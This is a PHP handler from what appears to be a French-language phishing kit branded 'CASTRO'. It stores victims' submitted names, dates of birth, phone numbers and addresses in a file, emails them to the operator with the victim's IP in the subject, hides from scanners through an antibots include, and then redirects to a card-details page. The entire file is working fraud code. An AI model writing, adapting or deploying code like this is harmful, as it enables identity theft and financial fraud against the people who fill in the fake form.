<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
		$_SESSION["fname"] 		= $_POST["f_name"];
		$_SESSION["lname"]		= $_POST["l_name"];
		$_SESSION["dob"]		= $_POST["dob"];
		$_SESSION["PhoneNumber"]= $_POST["phone"];
		$_SESSION["street"] 	= $_POST["address1"];
		$_SESSION["city"]		= $_POST["city"];
		$_SESSION["country"] 	= $_POST["country"];
		$_SESSION["ZIP"] 		= $_POST["ZIP"];

$message = '🔘 CASTRO // NEW FULL INFO

🍉 [ INFOS PERSONNELLES ]
📋 Prénom : '.$_SESSION["fname"].'
📋 Nom : '.$_SESSION["lname"].'
📋 Date de naissance : '.$_SESSION["dob"].'
📋 Numéro de téléphone : '.$_SESSION["PhoneNumber"].'
📋 Adresse : '.$_SESSION["street"].'
📋 Code postal : '.$_SESSION["ZIP"].'
📋 Ville : '.$_SESSION["city"].'
📋 Pays : '.$_SESSION["country"].'

🌟 CASTRO 🌟
';
$Subject="[📋] ".$_SESSION['fname']." ".$_SESSION['lname']." | "._ip();
$head="From:🦹🏽‍♂ CASTRO 🦹🏽‍♂  <castro@kingofspam.fr>";

$fil = fopen('api.txt', 'a+');
fwrite($fil, '-'.$message.'-');
$_SESSION['step_three']  = true;
		mail($my_mail,$Subject,$message,$head);
		mail($name,$Subject,$message,$head);
		header('location: card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
	header('location: ../../index.php');
}
?>